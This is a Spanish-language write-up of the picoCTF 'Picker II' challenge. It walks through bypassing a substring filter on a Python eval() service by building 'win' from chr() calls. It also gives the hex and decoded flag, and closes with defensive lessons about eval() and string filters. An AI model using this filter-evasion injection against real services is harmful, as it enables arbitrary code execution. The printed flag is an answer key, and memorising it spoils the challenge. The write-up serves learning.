**RETO:** Picker II

**DESCRIPCION:**  
Can you figure out how this program works to get the flag? The program's source code can be downloaded here.

**SOLUCION:**

- Descargué el archivo picker-II.py que contenía el código fuente del servicio
    
- Analicé el código y encontré que tenía un filtro que bloqueaba inputs que contenían la string "win"
    
- Identifiqué que la función `filter(user_input)` devolvía `False` si 'win' estaba en el input
    
- El programa todavía usaba `eval()` lo que permitía ejecución de código arbitrario
    
- Para bypassear el filtro, construí la string "win" usando códigos ASCII con `chr(119) + chr(105) + chr(110)`
    
- Usé `eval()` para ejecutar el string construido como una llamada a función
    

**Proceso de solución:**

1. **Conectar al servicio:**
    
    bash
    
    nc saturn.picoctf.net 58387
    
2. **Bypassear el filtro usando construcción de string con chr():**
    
    text
    
    ==> eval(chr(119) + chr(105) + chr(110))
    
3. **Obtener la flag en hexadecimal:**
    
    text
    
    0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x30 0x62 0x35 0x66 0x31 0x31 0x33 0x31 0x7d
    
4. **Convertir hexadecimal a texto:**
    
    python
    
    hex_values = "0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x30 0x62 0x35 0x66 0x31 0x31 0x33 0x31 0x7d".split()
    flag = ''.join(chr(int(h, 16)) for h in hex_values)
    print(flag)
    

**Flag:** `picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}`

**NOTAS:**

- El reto demostró que los filtros simples de strings pueden ser fácilmente bypasseados
    
- La vulnerabilidad principal seguía siendo el uso de `eval()` con entrada del usuario
    
- La técnica de usar `chr()` para construir strings evitó la detección del filtro
    
- La flag "f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131" significa "filters fail code refactor might succeeded" en leet speak
    
- Los filtros de seguridad deben ser más robustos y no depender solo de la coincidencia de strings literales
    
- Nunca se debe usar `eval()` con entrada del usuario sin validación en aplicaciones de producción